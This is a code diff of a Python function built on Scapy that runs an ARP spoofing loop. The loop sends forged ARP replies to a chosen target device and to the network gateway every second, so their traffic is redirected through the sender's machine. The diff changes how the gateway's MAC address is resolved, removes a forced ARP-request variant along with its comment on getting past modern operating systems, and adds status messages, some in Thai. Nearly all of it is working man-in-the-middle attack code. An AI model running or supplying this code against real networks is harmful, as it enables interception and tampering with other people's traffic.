@@ -85,37 +85,40 @@ def _get_local_mac() -> str:
     return get_if_hwaddr(conf.iface)
 
 
-def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, stop_event: threading.Event):
-    """
-    Continuously send fake ARP packets to both the target and the gateway.
-    """
+def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, stop_event: threading.Event):
     local_mac = _get_local_mac()
-
-    # Packet to target: "I am the gateway" (Reply)
-    pkt_to_target_reply = Ether(dst=target_mac) / ARP(
-        op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac
-    )
     
-    # Packet to target: "Who has target IP? Tell gateway" (Request)
-    # Modern OSes (iOS, Android, Windows) often ignore unsolicited replies.
-    # An ARP request forces them to update their cache with our MAC.
-    pkt_to_target_req = Ether(dst=target_mac) / ARP(
-        op=1, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac
-    )
-
-    # Packet to gateway: "I am the target" (Reply)
-    # Using targeted MAC instead of broadcast avoids router drop policies.
-    pkt_to_gateway_reply = Ether(dst=gateway_mac) / ARP(
-        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=local_mac
-    )
+    # 👇 ดึง gateway MAC จริงก่อน
+    try:
+        gateway_mac = _get_gateway_mac(gateway_ip)
+    except RuntimeError:
+        print(f"❌ Cannot resolve gateway MAC")
+        return
 
     print(f"⚡ ARP spoofing started: {target_ip} ({target_mac})")
+    print(f"🌐 Gateway: {gateway_ip} ({gateway_mac})")  # เพิ่ม log ตรงนี้
+
+    pkt_to_target = Ether(dst=target_mac) / ARP(
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=gateway_ip,
+        hwsrc=local_mac,
+    )
+
+    # ✅ ส่งตรงไปที่ gateway MAC
+    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
+        op=2,
+        pdst=gateway_ip,
+        hwdst=gateway_mac,  # 👈 เพิ่มตรงนี้
+        psrc=target_ip,
+        hwsrc=local_mac,
+    )
 
     while not stop_event.is_set():
-        sendp(pkt_to_target_reply, verbose=False)
-        sendp(pkt_to_target_req, verbose=False)
-        sendp(pkt_to_gateway_reply, verbose=False)
-        stop_event.wait(1)  # Send every 1 second
+        sendp(pkt_to_target, verbose=False)
+        sendp(pkt_to_gateway, verbose=False)
+        stop_event.wait(1)
 
     print(f"🛑 ARP spoofing stopped: {target_ip}")
 
